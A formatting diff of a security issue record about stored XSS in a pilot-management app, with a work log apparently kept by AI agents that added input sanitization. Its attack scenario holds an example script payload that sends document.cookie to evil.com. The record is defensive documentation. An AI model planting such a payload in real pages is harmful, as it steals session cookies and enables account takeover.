@@ -1,7 +1,7 @@
 ---
 status: completed
 priority: p1
-issue_id: "035"
+issue_id: '035'
 tags: [security, xss, input-validation, sanitization]
 dependencies: []
 completed_date: 2025-10-19
@@ -20,9 +20,12 @@ User input in feedback posts, leave requests, and flight requests is not sanitiz
 - **Agent**: security-sentinel
 
 **Attack Scenario:**
+
 1. Malicious pilot submits feedback with title:
    ```html
-   <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
+   <script>
+     fetch('https://evil.com/steal?cookie=' + document.cookie)
+   </script>
    ```
 2. Title stored in database without sanitization
 3. Another pilot views feedback page
@@ -31,6 +34,7 @@ User input in feedback posts, leave requests, and flight requests is not sanitiz
 6. Attacker logs in as victim
 
 **Vulnerable Fields:**
+
 - `feedback_posts.title` - User-provided title (XSS risk)
 - `feedback_posts.content` - User-provided markdown/text (XSS risk)
 - `leave_requests.reason` - User-provided reason (XSS risk)
@@ -63,6 +67,7 @@ export function sanitizePlainText(input: string): string {
 ```
 
 **Usage in Server Actions:**
+
 ```typescript
 import { sanitizeHtml, sanitizePlainText } from '@/lib/sanitize'
 
@@ -106,12 +111,15 @@ export function escapeHtml(text: string): string {
 ## Work Log
 
 ### 2025-10-19 - Initial Discovery
+
 **By:** security-sentinel (compounding-engineering review)
 **Learnings:** No input sanitization enables XSS attacks
 
 ### 2025-10-19 - Implementation Complete
+
 **By:** Claude Code
 **Changes:**
+
 1. Installed `isomorphic-dompurify` package (v2.x)
 2. Created `lib/sanitize.ts` with comprehensive sanitization functions:
    - `sanitizeHtml()` - Sanitize HTML content while preserving safe formatting
